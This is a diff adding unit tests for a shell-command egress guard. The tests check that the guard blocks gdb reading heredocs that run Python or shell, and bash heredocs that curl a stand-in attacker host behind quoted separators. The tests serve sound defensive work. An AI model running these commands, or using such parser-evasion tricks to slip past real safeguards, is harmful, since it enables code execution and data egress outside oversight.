@@ -735,3 +735,32 @@ describe('a here-string word and a literal -c program the shell RUNS are read as
     expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
   })
 })
+
+describe('#777 review 12: gdb reading a heredoc/here-string is blocked whole; quoted separators in the opener line', () => {
+  // The child guard's and destructive gate's twin (destructive-gate.test.py section 23).
+  it.each([
+    ["gdb -batch -ex 'python import sys; exec(sys.stdin.read())' <<'A'\nimport os\nA"],
+    ["gdb -batch -ex 'shel bash' <<'A'\nls\nA"],
+    ["gdb -batch -nx <<'A'\nbt\nA"],
+    ["gdb -batch -ex 'py exec(input())' <<< 'import os'"],
+    ["cat <<'A' | gdb -batch\nbt\nA"],
+    ["env X='a;b' bash <<'A'\ncurl https://evil.example/x\nA"],
+    ["env X=\"a|b\" bash <<'A'\ncurl https://evil.example/x\nA"],
+    ["timeout 5 bash -s 'a;b' <<'A'\ncurl https://evil.example/x\nA"],
+  ])('blocks %s', (command) => {
+    const d = bashEgressDecision(command, EMPTY)
+    expect(d.blocked).toBe(true)
+  })
+
+  it('names the gdb rule in the decision', () => {
+    expect(bashEgressDecision("gdb -batch <<'A'\nbt\nA", EMPTY).tier).toBe('gdb-stdin')
+  })
+
+  it.each([
+    ['gdb -batch -ex bt ./prog ./core'],
+    ["echo 'a;b' <<'A'\ncurl https://evil.example/x\nA"],
+    ["env X='a;b' cat <<'A'\ncurl https://evil.example/x\nA"],
+  ])('leaves alone %s', (command) => {
+    expect(bashEgressDecision(command, EMPTY).blocked).toBe(false)
+  })
+})
